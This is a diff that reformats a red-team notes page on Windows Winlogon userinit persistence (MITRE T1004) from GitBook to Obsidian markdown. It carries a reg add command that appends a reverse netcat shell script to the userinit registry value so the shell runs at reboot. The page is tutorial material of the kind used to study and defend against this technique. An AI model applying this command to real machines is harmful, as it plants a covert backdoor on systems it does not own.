@@ -12,9 +12,8 @@ HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
 ```
 
-{% hint style="info" %}
-HKCU can also be replaced with HKLM for a system wide persistence, if you have admin privileges.
-{% endhint %}
+> [!INFO]
+> HKCU can also be replaced with HKLM for a system wide persistence, if you have admin privileges.
 
 ## Execution
 
@@ -26,7 +25,7 @@ Let's see what's currently held at the `userinit`:
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
 ```
 
-![](<../../.gitbook/assets/image (424).png>)
+![[image (424).png]]
 
 Let's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to be launched when the compromised machine reboots:
 
@@ -34,12 +33,12 @@ Let's now add an additional item shell.cmd (a simple reverse netcat shell) to th
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
 ```
 
-![](<../../.gitbook/assets/image (425).png>)
+![[image (425).png]]
 
 Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:
 
-![](<../../.gitbook/assets/image (426).png>)
+![[image (426).png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/techniques/T1004/" %}
+[attack.mitre.org/techniques/T1004](https://attack.mitre.org/techniques/T1004/)
